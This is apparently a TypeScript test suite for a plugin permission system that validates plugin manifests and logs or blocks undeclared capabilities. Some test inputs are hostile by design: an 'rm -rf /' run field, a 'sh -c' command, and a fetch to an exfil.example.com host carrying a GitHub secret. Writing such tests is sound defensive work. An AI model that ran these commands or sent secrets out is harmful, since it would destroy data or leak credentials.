/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { Emitter, Event } from '../../../../../base/common/event.js';
import { DisposableStore, toDisposable } from '../../../../../base/common/lifecycle.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { IVoltHostToolInfo } from '../../../voltRuntime/common/hostTools.js';
import { capabilityClass, ICapabilityReporter, IVoltPluginPrincipal, manifestDenial, ReportModeCapabilityReporter, VoltCapabilityError } from '../../common/capabilities.js';
import { createVoltApi, IVoltApiBackend, VoltApiUnavailableError } from '../../common/voltApi.js';
import { IVoltPluginManifest, validateVoltContribution, validateVoltContributes } from '../../common/voltContributions.js';

const GOOD: IVoltPluginManifest = {
	publisher: 'acme',
	name: 'notes',
	engines: { volt: '^1.0.0' },
	contributes: {
		voltModule: { feature: 'acmeNotes', label: 'Notes', description: 'Notes for agents.', category: 'productivity', icon: 'note', order: 100, commands: ['acme.notes.open'], settings: ['acme.notes.'] },
		voltTools: [{ name: 'notes_read', class: 'safe', title: 'Read notes', description: 'Reads a note.', inputSchema: { type: 'object', properties: { id: { type: 'string' } } } }],
		voltSlotItems: [{ id: 'acme.notes', label: 'Notes', slot: 'sidebar.footer', command: 'acme.notes.open' }],
		voltSettingsPages: [{ id: 'acmeNotes', label: 'Notes' }],
		voltSurfaces: [{ id: 'acmeNotes', label: 'Notes' }],
		voltDock: [{ id: 'acmeNotes', label: 'Notes' }],
		voltAgents: [{
			id: 'acme', label: 'Acme', binary: 'acme', args: ['--acp', '--model', '${model}'], apiHosts: ['api.acme.dev'],
			state: { configOverlay: 'ACME_CONFIG_DIR', writable: ['projects/${projectSlug}'], mergeBack: ['model'] },
			probe: { command: ['acme', 'auth', 'status'], parse: 'regex:^Logged in' },
			models: { source: 'acp' },
		}],
		voltCapabilities: {
			required: [{ id: 'tools.register', class: 'low' }, { id: 'agents.read:any', class: 'medium' }],
			optional: [{ id: 'net.connect', class: 'low', targets: ['api.acme.dev', '*.acme.dev'] }],
		},
	},
};

suite('Volt plugins: contribution points', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('a complete manifest validates', () => {
		assert.deepStrictEqual(validateVoltContributes(GOOD.contributes), []);
	});

	test('schema errors name the field', () => {
		const errors = (point: Parameters<typeof validateVoltContribution>[0], value: unknown) => validateVoltContribution(point, value).join('\n');
		assert.match(errors('voltTools', [{ name: 'notes_read' }]), /voltTools\[0\]: missing "class"/);
		assert.match(errors('voltTools', [{ name: 'Notes Read', class: 'safe' }]), /voltTools\[0\]\.name/);
		assert.match(errors('voltTools', [{ name: 'notes_read', class: 'safe', run: 'rm -rf /' }]), /unknown property "run"/);
		assert.match(errors('voltSlotItems', [{ id: 'acme.notes' }]), /missing "label"/);
		assert.match(errors('voltSettingsPages', { id: 'x', label: 'X' }), /expected array/);
		assert.match(errors('voltModule', { ...GOOD.contributes!.voltModule, category: 'elsewhere' }), /voltModule\.category: must be one of/);
		assert.match(errors('voltModule', { feature: 'x' }), /missing "label"/);
		// H.12: a bare binary name, never a path or a shell line.
		assert.match(errors('voltAgents', [{ id: 'acme', binary: '/usr/local/bin/acme' }]), /binary/);
		assert.match(errors('voltAgents', [{ id: 'acme', command: 'sh -c x' }]), /unknown property "command"/);
		assert.match(errors('voltAgents', [{ id: 'acme', state: { configOverlay: 'lower-case' } }]), /configOverlay/);
		assert.match(errors('voltAgents', [{ id: 'acme', models: { source: 'magic' } }]), /models\.source/);
		assert.match(errors('voltCapabilities', { required: [{ id: 'agents.send' }] }), /missing "class"/);
	});

	test('rules beyond the schema: unique ids, tool classes and capability classes', () => {
		assert.match(validateVoltContribution('voltDock', [{ id: 'a', label: 'A' }, { id: 'a', label: 'B' }]).join(), /"a" is listed twice/);
		// desktop_act escapes the sandbox: it can't be declared as a safe tool.
		assert.match(validateVoltContribution('voltTools', [{ name: 'desktop_act', class: 'safe' }]).join(), /desktop_act is a "escapes" tool/);
		assert.deepStrictEqual(validateVoltContribution('voltTools', [{ name: 'desktop_act', class: 'escapes' }]), []);
		// A capability can't be declared below its catalog class, and must exist.
		assert.match(validateVoltContribution('voltCapabilities', { required: [{ id: 'secrets.read', class: 'low' }] }).join(), /secrets\.read" is critical/);
		assert.match(validateVoltContribution('voltCapabilities', { required: [{ id: 'mind.read', class: 'none' }] }).join(), /not a Volt capability/);
		assert.deepStrictEqual(validateVoltContribution('voltCapabilities', { required: [{ id: 'secrets.use:github', class: 'high' }, { id: 'net.connect@1', class: 'low' }] }), []);
	});

	test('the capability catalog (G.8)', () => {
		assert.strictEqual(capabilityClass('ui.contribute'), 'none');
		assert.strictEqual(capabilityClass('tools.register'), 'low');
		assert.strictEqual(capabilityClass('agents.read:current'), 'low');
		assert.strictEqual(capabilityClass('agents.read:any'), 'medium');
		assert.strictEqual(capabilityClass('agents.read:other'), 'high');
		assert.strictEqual(capabilityClass('secrets.use:github'), 'high');
		assert.strictEqual(capabilityClass('commands.execute:git.push'), 'high');
		assert.strictEqual(capabilityClass('commands.execute:*'), 'critical');
		assert.strictEqual(capabilityClass('files.read:home'), 'critical');
		assert.strictEqual(capabilityClass('net.connect@1'), 'low');
		assert.strictEqual(capabilityClass('agents.read'), undefined);
	});
});

suite('Volt plugins: the volt API in report mode', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	function setup(manifest: IVoltPluginManifest = GOOD, reporterOverride?: ICapabilityReporter) {
		const logs: string[] = [];
		const reporter = new ReportModeCapabilityReporter(message => logs.push(message));
		store.add(toDisposable(() => reporter.dispose()));
		const calls: { method: string; args: unknown[] }[] = [];
		const storage = new Map<string, string>();
		const tools: IVoltHostToolInfo[] = [];
		const settingsEmitter = store.add(new Emitter<{ affects(key: string): boolean }>());
		const backend: IVoltApiBackend = {
			registerTool: (info, _invoke) => {
				tools.push(info);
				return toDisposable(() => tools.splice(tools.indexOf(info), 1));
			},
			invokeTool: async (name, args) => {
				calls.push({ method: name, args: [args] });
				return { text: `ran ${name}` };
			},
			storageGet: key => storage.get(key),
			storageSet: (key, value) => value === undefined ? storage.delete(key) : storage.set(key, value),
			storageKeys: prefix => [...storage.keys()].filter(key => key.startsWith(prefix)),
			getSetting: key => `value of ${key}`,
			updateSetting: async (key, value) => { calls.push({ method: 'updateSetting', args: [key, value] }); },
			onDidChangeSettings: settingsEmitter.event,
			executeCommand: async (id, args) => { calls.push({ method: id, args: [...args] }); return 'done'; },
			registerCommand: () => toDisposable(() => { }),
			isOn: () => true,
		};
		const subscriptions = store.add(new DisposableStore());
		const principal: IVoltPluginPrincipal = { extensionId: `${manifest.publisher}.${manifest.name}`, firstParty: false, capabilities: manifest.contributes?.voltCapabilities ?? {} };
		const volt = createVoltApi(principal, manifest, backend, reporterOverride ?? reporter, subscriptions);
		return { volt, reporter, logs, calls, storage, tools, subscriptions };
	}

	test('M1 report mode: a would-be denial is logged once and the call still runs', async () => {
		const { volt, reporter, logs, calls } = setup();
		// agents.send is not in the manifest: medium class, undeclared.
		const first = await volt.agents.send('chat-1', 'hello');
		const second = await volt.agents.send('chat-1', 'again');
		assert.deepStrictEqual([first.text, second.text], ['ran thread_send', 'ran thread_send']);
		assert.deepStrictEqual(calls.map(call => call.method), ['thread_send', 'thread_send']);
		assert.deepStrictEqual(reporter.reports, [{
			extensionId: 'acme.notes', api: 'agents.send', capability: 'agents.send', target: 'chat-1', class: 'medium', deniedBy: 'manifest',
			reason: 'agents.send (medium) is not declared in contributes.voltCapabilities',
		}]);
		assert.strictEqual(logs.length, 1);
		assert.match(logs[0], /report mode: acme\.notes would be denied agents\.send on chat-1/);
	});

	test('declared and automatic capabilities report nothing', async () => {
		const { volt, reporter, storage } = setup();
		await volt.agents.list();
		volt.storage.set('draft', { a: 1 });
		assert.deepStrictEqual(volt.storage.get('draft'), { a: 1 });
		assert.deepStrictEqual(volt.storage.keys(), ['draft']);
		assert.deepStrictEqual([...storage.keys()], ['volt.plugin.acme.notes.draft']);
		assert.strictEqual(volt.settings.get('acme.notes.width'), 'value of acme.notes.width');
		await volt.commands.execute('acme.notes.open');
		assert.ok(volt.ui.isOn('item', 'acme.notes'));
		await assert.rejects(volt.net.fetch({ url: 'https://api.acme.dev/v1/notes' }), VoltApiUnavailableError);
		volt.tools.register('notes_read', () => ({ text: 'note' }));
		assert.deepStrictEqual(reporter.reports, []);
	});

	test('what goes beyond the manifest is reported with its target', async () => {
		const { volt, reporter } = setup();
		await volt.commands.execute('git.push');
		volt.settings.get('editor.fontSize');
		await assert.rejects(volt.net.fetch({ url: 'https://exfil.example.com/x', secret: volt.secrets.ref('github') }), VoltApiUnavailableError);
		await volt.agents.create({ title: 'x' });
		assert.deepStrictEqual(reporter.reports.map(report => [report.capability, report.target, report.deniedBy]), [
			['commands.execute:git.push', 'git.push', 'manifest'],
			['full', 'editor.fontSize', 'manifest'],
			['secrets.use:github', 'github', 'manifest'],
			['net.connect', 'exfil.example.com', 'manifest'],
			['secrets.use:github', 'exfil.example.com', 'manifest'],
			['agents.create', undefined, 'manifest'],
		]);
	});

	test('a tool registers with its manifest schema; an undeclared or escaping one is reported', () => {
		const { volt, reporter, tools, subscriptions } = setup();
		volt.tools.register('notes_read', () => ({ text: 'note' }));
		assert.deepStrictEqual(tools.map(tool => [tool.name, tool.title, tool.inputSchema]), [['notes_read', 'Read notes', { type: 'object', properties: { id: { type: 'string' } } }]]);
		assert.strictEqual(reporter.reports.length, 0);
		// desktop_act is Volt's escaping tool, whatever the plugin says.
		volt.tools.register('desktop_act', () => ({ text: '' }));
		assert.deepStrictEqual(reporter.reports.map(report => report.capability), ['full', 'spawn.unsandboxed']);
		// Disposing the context's subscriptions unloads what it registered.
		subscriptions.clear();
		assert.deepStrictEqual(tools, []);
	});

	test('the enforcing seam: a refused call throws a typed error and never reaches Volt', async () => {
		const enforcing: ICapabilityReporter = {
			mode: 'enforce',
			onDidReport: Event.None,
			check: (principal, request) => {
				const denial = manifestDenial(principal, request);
				return denial ? { allowed: false, denial } : { allowed: true };
			},
		};
		const { volt, calls } = setup(GOOD, enforcing);
		assert.throws(() => volt.agents.send('chat-1', 'x'), (error: unknown) => error instanceof VoltCapabilityError && error.capability === 'agents.send' && error.deniedBy === 'manifest');
		assert.strictEqual(calls.length, 0);
		await volt.agents.list();
		assert.deepStrictEqual(calls.map(call => call.method), ['thread_list']);
	});

	test('identity is the principal core set, not the manifest or a payload', () => {
		const { volt, reporter } = setup({ ...GOOD, contributes: { ...GOOD.contributes, voltCapabilities: { required: [{ id: 'agents.send', class: 'medium' }] } } });
		// A declared capability with targets covers only those targets.
		const scoped = setup({ ...GOOD, contributes: { ...GOOD.contributes, voltCapabilities: { required: [{ id: 'agents.send', class: 'medium', targets: ['chat-1'] }] } } });
		void volt.agents.send('chat-9', 'x');
		void scoped.volt.agents.send('chat-1', 'x');
		void scoped.volt.agents.send('chat-9', 'x');
		assert.deepStrictEqual(reporter.reports, []);
		assert.deepStrictEqual(scoped.reporter.reports.map(report => [report.target, report.reason]), [['chat-9', 'agents.send is declared for other targets than chat-9']]);
	});
});
